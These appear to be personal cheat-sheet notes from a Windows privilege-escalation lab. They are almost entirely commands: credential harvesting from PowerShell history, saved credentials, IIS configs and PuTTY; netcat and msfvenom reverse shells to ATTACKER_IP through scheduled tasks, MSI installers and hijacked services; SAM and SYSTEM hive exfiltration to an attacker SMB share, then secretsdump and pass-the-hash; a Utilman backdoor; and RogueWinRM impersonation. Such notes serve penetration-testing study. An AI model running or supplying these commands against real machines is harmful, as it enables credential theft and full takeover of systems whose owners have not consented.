#### Harvesting Password
  #### Powershell History　　－　in cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    // To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

  #### Saved Windows Credentials
    cmdkey /list
    //runas to view a username in the list, nad launch a cmd
    runas /savecred /user:xxx cmd.exe

  #### IIS Configuration
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
    or C:\inetpub\wwwroot\web.config

  #### Retrieve Credentials from Software: PuTTY
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
      // Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
  #### Scheduled Tasks
    schtasks
    schtasks /query /tn vulntask /fo list /v //to view a particular task

    icacls c:\tasks\xxx  //to view the privi, F is full access

    //if yes we can modify it as a backdoor,
    echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
    schtasks /run /tn vulntask  //run immediately
  
  #### AlwaysInstallElevated  
    msi files can be configured to run with higher privileges from any user account (even unprivileged ones)
      //enable below 2 values
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    //msf create revershell msi, should also run the Metasploit Handler module configured accordingly
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

     msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

  #### win service - insecure permission on sercie executable -- msf requied for creating a reverse shell file 
    sc qc xxx // to check info of a particular service, we'll have the binary file path, the executed accountname.
    icacls Path:\xxx  //check the privi of this binary file of this serviice

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe //create shell file and transfer to the host
    move C:\Users\thm-unpriv\rev-svc.exe WService.exe  //raap[lace the binary file
    icacls WService.exe /grant Everyone:F  // grant full privi 
    nc -nvlp xxxx 

    sc stop xxxservice
    sc start xxxservice  //restart this service to trigger shell // PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

  #### win service - Unquoted Service Paths - msf requied for creating a reverse shell file 
    sc qc "disk sorter enterprise"  
      DISPLAY_NAME       : Disk Sorter Enterprise  //spaces on the name of the "Disk Sorter Enterprise" folder
      //SCM doesn't know which of the following you are trying to execute:C:\MyPrograms\Disk.exe plus  Argument1:Sorter plus Argument1:Enterprise\bin\disksrs.exe
      or C:\MyPrograms\Disk Sorter.exe  plus  Argument1:Enterprise\bin\disksrs.exe
      or C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
    we put the revershell file on C:\\MyPrograms\\Disk.exe // we must have write privi to this path
     //most of the service executables will be installed under C:\Program Files or C:\Program Files (x86)
    //restart the service and get shell

   #### win service - Insecure Service Permissions -  msf requied for creating a reverse shell file 
     //check for a service DACL from the command line, you can use Accesschk.exe
       [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users  //SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
     accesschk64.exe -qlc xxx
     //generate reversehll file , grant privi,modify config of service 
     sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem  // localsystem is high privi of a local host.
  #### Windows Privileges - SeBackup / SeRestore
    whoami /priv
      SeBackupPrivilege             Back up files and directories  Disabled
      SeRestorePrivilege            Restore files and directories  Disabled
    reg save hklm\system C:\Users\THMBackup\system.hive
    reg save hklm\sam C:\Users\THMBackup\sam.hive

    //on attack host, set a smb server
      impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 public share  //make sure impacket installed on kali

    C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
    C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

    impacket-secretsdump -sam sam.hive -system system.hive LOCAL
    impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.201.91.4

  #### Windows Privileges - SeTakeOwnership
    takeown /f C:\Windows\System32\Utilman.exe
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
    C:\Windows\System32\> copy cmd.exe utilman.exe
    //lock account, then click ease of access button , will get a shell with system
    
  
  #### Windows Privileges - SeImpersonate / SeAssignPrimaryToken
    RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
